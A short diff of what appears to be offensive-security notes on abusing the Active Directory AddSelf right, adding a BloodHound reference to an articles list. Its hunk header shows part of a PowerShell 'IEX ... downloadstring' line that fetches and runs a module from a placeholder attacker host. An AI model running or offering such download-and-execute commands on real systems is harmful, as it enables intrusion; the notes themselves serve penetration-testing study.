@@ -43,8 +43,9 @@ Load module -> `IEX (new-object net.webclient).downloadstring('http://<your_evil
 <br>
 
 ### Articles:
-https://www.hackingarticles.in/addself-active-directory-abuse/
 
+https://www.hackingarticles.in/addself-active-directory-abuse/
+https://bloodhound.specterops.io/resources/edges/add-self
 
 
 
